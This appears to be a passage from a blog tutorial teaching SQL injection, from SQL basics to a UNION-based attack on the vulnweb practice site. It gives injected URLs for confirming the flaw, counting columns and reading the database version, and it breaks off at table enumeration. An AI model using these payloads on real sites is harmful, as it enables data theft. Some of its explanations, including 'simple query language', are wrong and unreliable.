@@ -1,0 +1,645 @@
+I"h�<p>In this article you will learn SQL Injection fundamentals from 0 to hero.
+<br />
+In order to understand SQL injections, it is essential to observe those two concepts seperately.</p>
+
+<h2 id="what-is-injection-">WHAT IS INJECTION ?</h2>
+<p>Injection refers to a broad variety of attack vectors. An attacker feeds the program with malicious input.
+This input interpreted by the program and works for attacker’s favour.This vulnerability occurs when the input is not controlled 
+with meticulousness before or after input has taken.There are bunch of different kind of injections out there.
+Examples are javascript ,ldap, xpath, host header, code, email header and crlf injections and SQL injection is one of them.</p>
+<h2 id="what-is-sql-">WHAT IS SQL ?</h2>
+<p>SQL stands for <strong>simple query language</strong>. What it does is basically, managing data held in databases.
+It is particularly useful in handling structured data. So whenever you ask for spesific part of data
+you can request it in any order or concatanate it with different data held in different data table. 
+There are bunch of different sql types, MySQL, SqLite, PostgreSQL, Microsoft SQL Server and etc. They are
+actually more or less all the same except for the syntax diffrences between them.</p>
+
+<h3 id="understanding-sql">Understanding SQL</h3>
+<p>Let us examine the behavior of SQL codes by using <a href="https://www.sqliteonline.com"><strong>sqliteonline</strong></a></p>
+
+<p><img src="/assets/img/posts/fundamentals-of-sql-injection/sql.jpg" alt="Desktop View" />
+<br /></p>
+
+<h4 id="why-sql-">Why SQL ?</h4>
+<p>As you can see, there is a table consists of 3 columns and 21 rows.Those are basically <strong>key</strong> and <strong>value</strong> pairs.
+In this spesific example <code class="language-plaintext highlighter-rouge">ID</code> is the <strong>Key</strong> value, <code class="language-plaintext highlighter-rouge">Name</code> and <code class="language-plaintext highlighter-rouge">Hint</code> are the <strong>value</strong>s which defined by that 
+spesific ‘ID’ numer of <strong>1</strong>.However, as you can guess, it is not practical to summon whole data each 
+time when we want to use or see one or couple parts of the data. In addition, we may want to combine different 
+data parts together, so that is why we use SQL.</p>
+
+<h4 id="sql-basics">SQL Basics</h4>
+<p>Every table has its own name, and the name of the table above is <strong>demo</strong>.It is not needed to be an expert
+SQL programmer, but you need to understand the principles of SQL programming, so let us start with some basics.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span><span class="p">;</span></code></pre></figure>
+
+<p>This command selects everything from demo table, fetches full content from the table.
+You can see the output at the picture above. 
+<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span></code></pre></figure>
+
+<p>If you want to bring the informations related to ‘ID’ number of 3, you can add <code class="language-plaintext highlighter-rouge">WHERE</code> clause at the end of the query, and specify the filter.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql3.jpg" alt="Desktop View" />
+<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">Name</span><span class="o">=</span><span class="nv">"Chart"</span><span class="p">;</span></code></pre></figure>
+
+<p>You can concatenate two different queries together by using ‘UNION’, however result of the
+queries have to have same amount of columns, otherwise it will not work. In this example, there is
+only one table called <strong>demo</strong>, so naturally all the selections will have 3 columns.If the result of the select queries of different
+tables have different amount of columns, you can not <code class="language-plaintext highlighter-rouge">UNION</code> the result of the selections together.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql4.jpg" alt="Desktop View" />
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">name</span> <span class="k">ASC</span><span class="p">;</span></code></pre></figure>
+
+<p>You can order the table with <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause.You can either put column number with numerics, or column name
+both <code class="language-plaintext highlighter-rouge">ASC</code> ascending and <code class="language-plaintext highlighter-rouge">DESC</code> descending order.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql5.jpg" alt="Desktop View" />
+<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">1</span> <span class="k">ASC</span><span class="p">;</span></code></pre></figure>
+
+<p>See all the tables existing in the currently active database.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql6.jpg" alt="Desktop View" />
+<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SHOW</span> <span class="n">DATABASES</span><span class="p">;</span></code></pre></figure>
+
+<p>See all the created databases.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql7.jpg" alt="Desktop View" /></p>
+
+<h3 id="summary">Summary</h3>
+<p>Understanding this much of SQL will do for now.In this section I wrote about basics of SQL, however in the following
+sections I will be writing about tricks and tactics about SQL Injection, it is more imporant to understand very fundamentals
+rather than complex queries.</p>
+
+<h2 id="primitives-of-database-logic">PRIMITIVES OF DATABASE LOGIC</h2>
+<p>From now on, you know how sql works, and the idea behind that. In this section, before moving on to the exploitation phase, 
+you will learn bare-bones of <strong>SQLi</strong>, database logic and do some brainstorm. In this section I will be using <strong>MariaDB</strong>, it is community
+developed database management system for MySQL.</p>
+
+<h3 id="mariadbmysql">MariaDB/MySQL</h3>
+<p>I fired up my terminal and run my mariadb service. Without selecting any database or any table, I will run the following query.
+Try to guess the result of it.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">;</span></code></pre></figure>
+
+<p>It returns</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">---+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">#&gt;&gt;&gt;</span> <span class="n">This</span> <span class="k">is</span> <span class="n">the</span> <span class="k">column</span> <span class="n">name</span>
+<span class="o">+</span><span class="c1">---+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">#&gt;&gt;&gt;</span> <span class="n">This</span> <span class="k">is</span> <span class="n">the</span> <span class="n">value</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">that</span> <span class="k">column</span><span class="p">.</span>
+<span class="o">+</span><span class="c1">---+</span></code></pre></figure>
+
+<p>Does not make too much sense right ? Let us move further.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>
+
+<p>How do you think this will end up ?</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span>   <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span></code></pre></figure>
+
+<p>From now on, we know that we can do <strong>mathematical operations</strong> with integers in sql, this is huge.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2-1'</span><span class="p">;</span></code></pre></figure>
+
+<p>It is same as before except for the single quotes.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span></code></pre></figure>
+
+<p>This time what we see is returning of a string value. It is reasonable because single or double quotes
+are used for strings.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span><span class="o">-</span><span class="s1">'1'</span><span class="p">;</span></code></pre></figure>
+
+<p>It is hard to predict what is going to happen this time right ? Let us see.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span> <span class="s1">'2'</span><span class="o">-</span><span class="s1">'1'</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span></code></pre></figure>
+
+<p>Database actually performed the same mathematical operation as before when we did <code class="language-plaintext highlighter-rouge">SELECT 2-1</code>. That is because just like you,
+database’s mind get confused too, so it came up with an idea that ‘Oh wait, I can cast them into integers !’.Now we are one more
+step closer to understand the primitive behaviour of how databases work actually.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span><span class="o">+</span><span class="s1">'a'</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span> <span class="s1">'2'</span><span class="o">+</span><span class="s1">'a'</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span>       <span class="mi">2</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span></code></pre></figure>
+
+<p>Hmm, brains burning right ? It is simple really, just like before database converted string value to integer, however it could not convert
+<strong>a</strong> to any integer, so it considered it as <strong>0</strong>.By having this knowledge you should guess the output of this query.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'b'</span><span class="o">+</span><span class="s1">'a'</span><span class="p">;</span></code></pre></figure>
+
+<p>You predicted it ?</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span> <span class="s1">'b'</span><span class="o">+</span><span class="s1">'a'</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span>
+<span class="o">|</span>       <span class="mi">0</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+</span></code></pre></figure>
+
+<p>This time two non-convertible to integer values given into single quoutes, database performed <strong>0+0</strong> this time.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span><span class="p">;</span></code></pre></figure>
+
+<p>This time instead putting an operation sign between those strings, we will left it blank.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">----+</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+</span>
+<span class="o">|</span> <span class="mi">21</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+</span></code></pre></figure>
+
+<p>As you can see, strings had been concatanated. So <code class="language-plaintext highlighter-rouge">SELECT '2' '1'</code> and <code class="language-plaintext highlighter-rouge">concat('2','1')</code> do the same thing.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="p">;</span></code></pre></figure>
+
+<p>You should be able to guess this one.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">21</span><span class="n">a</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span></code></pre></figure>
+
+<p>Yes you are right, still string concat.
+<br />
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>
+
+<p>From now on we know that, <code class="language-plaintext highlighter-rouge">'a'-1</code> will result -1. So this time instead of string concat, it will substract
+-1 from 21.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">+</span><span class="c1">---------------+</span>
+<span class="o">|</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+</span>
+<span class="o">|</span>            <span class="mi">20</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+</span></code></pre></figure>
+
+<p><br />
+<br />
+There are few operants that you need to know.<br />
+<code class="language-plaintext highlighter-rouge">^</code>=XOR operator
+<code class="language-plaintext highlighter-rouge">!</code>=NOT operator</p>
+
+<h3 id="discipline">Discipline</h3>
+<p>We have discovered some primitive behaviours of the database. Now we need to understand
+which discipline we need to adopt to find a sql injection.</p>
+
+<p>Lets say there is a back end code running at the server just like that.</p>
+
+<p>PSEUDO CODE</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"No news"</span><span class="p">)</span></code></pre></figure>
+
+<p>This is the pseudo code to illustrate possible setup working on a web server to bring html document.
+However we do not have access to this backend code, so what we are trying to do is that, we need to observe
+the behavior of the responds to see if there is an injection possiblity.</p>
+
+<p>Now lets say there are two html pages, one for id ‘1’, and one for id ‘2’:</p>
+
+<p>ID1</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;h1&gt;</span>This is html document for ID 1<span class="nt">&lt;/h1&gt;</span></code></pre></figure>
+
+<p>ID2</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;h1&gt;</span>This is html document for ID 2<span class="nt">&lt;/h1&gt;</span></code></pre></figure>
+
+<p>While we dont have access to backend code, we can modify url.</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">www.xyz.com/?id=</code></pre></figure>
+
+<p>As you can tell, we can bring one of those two html documents by passing related ID number to the <code class="language-plaintext highlighter-rouge">?id=</code> parameter.<br />
+Right now all the behaviour we have learned should make sense. We can either make request for <code class="language-plaintext highlighter-rouge">?id=1</code> or <code class="language-plaintext highlighter-rouge">=id=2-1</code>, both
+will bring the first html document which has ID1.</p>
+<h4 id="principles">Principles</h4>
+<ul>
+  <li>We need to determine an initial, referance point for our examination.
+In this case, it is html document of ID1 which we trying to return.</li>
+  <li>Try to access to the initial point with different methods.
+In this case we forced database to make that 2-1 operation to get out initial point.
+<br /></li>
+</ul>
+
+<p>From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpected
+behavior. Key point is that, you could return your referance point with avoiding expected behavior.<br /><br />
+The question is that, what now ? How we can turn this vulnerability to our favour ? <br />
+In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not
+possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where <code class="language-plaintext highlighter-rouge">UNION</code> saves the day.
+<br />
+Instead of passing <code class="language-plaintext highlighter-rouge">1</code> or <code class="language-plaintext highlighter-rouge">2</code> or <code class="language-plaintext highlighter-rouge">2-1</code> into the <code class="language-plaintext highlighter-rouge">?id=</code> field, we can pass <code class="language-plaintext highlighter-rouge">1 UNION SELECT (rest of the query)</code><br />
+As you remember that is the code at the back end.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">www.xyz.com/?id='1 UNION SELECT .....'</code> <br />
+<br />Query will run this for http request above-&gt; <code class="language-plaintext highlighter-rouge">SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query)</code>
+<br /> However at this point of time, we have two problems.<br />
+1-What I will select in my own query ? What will replace the ,I do not know anything about the database.<br />
+2-<code class="language-plaintext highlighter-rouge">UNION</code> has its limitations, the number of columns that return for each query should match.<br />
+It is time to do some real sql injection on a web page.</p>
+
+<h2 id="vulnweb---union-sqli">VULNWEB - UNION SQLi</h2>
+<p><a href="http://test.php.vulnweb.com">http://test.php.vulnweb.com</a> is a vulnerable website for pentesting practice. Navigate to the web page.</p>
+<h3 id="remembering-the-principles">Remembering the principles</h3>
+<p>As we talked it about before, we have a principle that has two parts.
+<br />
+1-Determine your referance point
+<br />
+2-Find a way to get back to that referance point with unexpected behavior.
+<br /></p>
+
+<h3 id="making-sure-of-sql-injections-existence">Making sure of SQL injection’s existence</h3>
+<p>Navigate to <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a> <br />This will be our referance point.<br /><br />
+Than to <a href="http://testphp.vulnweb.com/listproducts.php?cat=2">http://testphp.vulnweb.com/listproducts.php?cat=2</a> <br />As we see different cat id brings different items from table.<br /><br />
+Than go for <a href="http://testphp.vulnweb.com/listproducts.php?cat=2-1">http://testphp.vulnweb.com/listproducts.php?cat=2-1</a> <br /><br />We tried an unexpected behavior, and eventually returned to our referance point.
+<br />Thus, now it is certain that this web site vulnerable to sql injection.
+<br />And this is because there is no <strong>input validation</strong> in the source code that is running on server side
+and anybody can pass whatever value they want in the input field, in this case in the <code class="language-plaintext highlighter-rouge">?id=</code> field.
+<br /></p>
+<h3 id="guessing-the-design">Guessing the design</h3>
+<p>If you observe the url, you can guess there is a table named <code class="language-plaintext highlighter-rouge">listproducts</code> and a column named <code class="language-plaintext highlighter-rouge">cat</code>.<br />
+Backend code may work like that:<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="p">(</span><span class="k">some</span> <span class="k">unknown</span> <span class="k">column</span> <span class="k">names</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">listproducts</span> <span class="k">WHERE</span> <span class="n">cat</span><span class="o">=</span></code></pre></figure>
+
+<p>Of course those names are not the same like that
+at the source code, so we still do not know any names from the database.
+And of course it may not work like that, just like I said, it is guessing.
+<br />
+After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">pass</span></code></pre></figure>
+
+<h3 id="finding-the-column-count">Finding the column count</h3>
+
+<p>As we talked before, after finding the vulnerability with <code class="language-plaintext highlighter-rouge">2-1</code>, it is crucial to run our own queries.<br />
+<code class="language-plaintext highlighter-rouge">UNION</code> will be starting point for this example. However we need to
+know how many columns there are.<br />The way to do that is enumerate: <br /><code class="language-plaintext highlighter-rouge">1 UNION SELECT 1</code> to <code class="language-plaintext highlighter-rouge">1 UNION SELECT 1....x</code>.
+<br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql10.jpg" alt="Desktop View" />
+<br />
+As you can see, when the number of columns are not match, this happens.
+<br /><br />To give you better understanding about this
+I will demonstrate this on my local machine with a test table.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="n">Baris</span>    <span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">2</span> <span class="o">|</span> <span class="n">Baris2</span>   <span class="o">|</span> <span class="n">Burak2</span>    <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1222</span> <span class="p">(</span><span class="mi">21000</span><span class="p">):</span> <span class="n">The</span> <span class="n">used</span> <span class="k">SELECT</span> <span class="n">statements</span> <span class="n">have</span> <span class="n">a</span> <span class="n">different</span> <span class="n">number</span> <span class="k">of</span> <span class="n">columns</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1222</span> <span class="p">(</span><span class="mi">21000</span><span class="p">):</span> <span class="n">The</span> <span class="n">used</span> <span class="k">SELECT</span> <span class="n">statements</span> <span class="n">have</span> <span class="n">a</span> <span class="n">different</span> <span class="n">number</span> <span class="k">of</span> <span class="n">columns</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">PErsonID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span> <span class="n">PersonID</span> <span class="o">|</span> <span class="n">LastName</span> <span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span>
+<span class="o">|</span>        <span class="mi">3</span> <span class="o">|</span> <span class="n">Baris3</span>   <span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
+<span class="o">|</span>        <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------+-----------+</span></code></pre></figure>
+
+<p>There are three columns for this table, <code class="language-plaintext highlighter-rouge">Person ID</code>, <code class="language-plaintext highlighter-rouge">LastName</code>, <code class="language-plaintext highlighter-rouge">FirstName</code>.It means the second query I will run after <code class="language-plaintext highlighter-rouge">UNION</code> should also
+have three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table 
+with a blank column.
+As you can see I am getting the same error as the error on website when the number of columns are not match.
+<br />
+<br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql9.jpg" alt="Desktop View" />
+<br />
+After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.
+Scroll down to the bottom, you should see someting different.
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11</a>
+<br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg" alt="Desktop View" />
+<br />
+There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the
+html document that contained in second, seventh and nineth columns in the table.<br />
+It means that we can run whatever we want in that areas to extract information from the database. For example lets run <code class="language-plaintext highlighter-rouge">version()</code>
+helper function at second, seventh or nienth column to see version of the server that running the database.
+<br />
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11</a>
+<br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql11.jpg" alt="Desktop View" />
+<br />
+After this point of time, all the helper functions are available for you.You can run the following to avoid first part of the
+sql query to only see your own query by selecting something non existent from the database.
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11</a></p>
+<h3 id="extracting-the-table-names">Extracting the table names</h3>
+<p>First thing to do is to gather all the table names exists in the database.For MySQl it is <code class="language-plaintext highlighter-rouge">information_schema</code> which provides
+access to database metadata.We are going to use methods of that information_schema to enumerate the database. 
